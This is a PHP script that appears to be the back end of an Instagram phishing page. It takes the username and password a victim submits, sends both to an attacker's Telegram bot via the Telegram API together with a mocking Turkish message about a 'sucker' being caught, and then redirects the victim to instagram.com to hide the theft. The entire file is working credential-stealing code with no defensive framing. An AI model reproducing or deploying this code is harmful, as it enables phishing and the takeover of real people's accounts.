
<?php
include('tg.php');

if($_POST){
$id= $_POST['id'];

$password=$_POST["password"];
$data = [
  'text' => '➡️ Lan Koş Sazan Düştü 😈 
Kullanıcı Adı : '.$id.'
Şifre : '.$password.'
',
  'chat_id' => $chat_id
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header('Location: https://instagram.com/');
}
?>
